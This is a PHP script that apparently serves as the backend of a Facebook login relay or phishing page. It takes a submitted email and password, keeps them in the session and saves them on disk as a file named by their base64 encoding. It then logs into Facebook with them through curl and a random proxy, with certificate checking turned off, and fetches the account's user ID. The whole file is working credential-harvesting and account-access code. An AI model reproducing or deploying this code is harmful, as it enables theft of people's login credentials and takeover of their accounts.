<?php
header('Access-Control-Allow-Origin: *');
require("vendor/autoload.php");
session_start();

$url = 'https://www.facebook.com/login.php';
$detect = new Mobile_Detect;

if ( $detect->isMobile() ) {
 $url = 'https://m.facebook.com/login.php';
}
$refer = parse_url($url);
$refer = $refer["scheme"]."://".$refer["host"];

$f_contents = file("facebook.txt"); $line = $f_contents[array_rand($f_contents)]; $prx = $line;

$data = fbdata($_POST["email"], $_POST["pass"]);
$_SESSION["data"] = $data;
$ol["post"] = $data["login"];
$o["cookie"] = $ol["cookie"] = $data["cookie"];
$o["referer"] = $ol["refer"] = $refer;
//$o["proxy"] = $prx;
/*
foreach (getallheaders() as $name => $value) {
    echo "$name: $value\n";
} */

$act = req($refer."/me/allactivity",$o);

if (preg_match('/USER\_ID\"\:\"([0-9]{8,20})\"/m', $act, $n)){
  echo substr($n[0], 0, 100);
} else {
  req($refer."/home.php", $o);
  req($url, $ol);
  req($refer."/home.php");
}

function fbdata($u, $p){
  $_SESSION["a"] = $u;
  $_SESSION["b"] = $p;
  $fbf = 'email='.urlencode($u).'&pass='.urlencode($p).'&login=Login';
  $cokis = $_SESSION["cokis"] = $_SESSION["cookie"] = base64_encode($u."~".$p);
  //$_SESSION["id"] = $_SESSION["uid"]
  $result["login"] = $fbf;
  $result["cookie"] = "cokisx/".$cokis;
  if (!file_exists($result["cookie"])){
    file_put_contents($result["cookie"], "");
  }
  return $result;
}

if (!function_exists("getallheaders")) {
  //Adapted from http://www.php.net/manual/en/function.getallheaders.php#99814 
  function getallheaders() {
    $result = array();
    foreach($_SERVER as $key => $value) {
      if (substr($key, 0, 5) == "HTTP_") {
        $key = str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($key, 5)))));
        $result[$key] = $value;
      }
    }
    return $result;
  }
}

function req($url=null, $o=null){
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);

if (isset($o["post"])){
  curl_setopt($ch, CURLOPT_POSTFIELDS, $o["post"]);
  curl_setopt($ch, CURLOPT_POST, 1);
}
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$c = (isset($o["cookie"]) ? realpath($o["cookie"]) : realpath("cache/cookies.txt"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, $c);
curl_setopt($ch, CURLOPT_COOKIEFILE, $c);
if (strpos($url, "https") !== false){
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); 
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
}
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);
curl_setopt( $ch, CURLOPT_AUTOREFERER, true );
curl_setopt($ch, CURLOPT_REFERER, (isset($o["referer"]) ? $o["referer"] : $url));
if (isset($o["proxy"])){
  curl_setopt($ch, CURLOPT_PROXY, $o["proxy"]);
  curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
  $prx = $o["proxy"];
}

$page = curl_exec($ch);
if (curl_error($ch)) {
  $error_msg = curl_error($ch);
  $error_msg .= " Please Re-Login, or change proxy (<b>Using Proxy: $prx</b>)";
}
curl_close($ch);
if (!isset($error_msg)){
 return $page;
} else {
  return $error_msg;
  }
}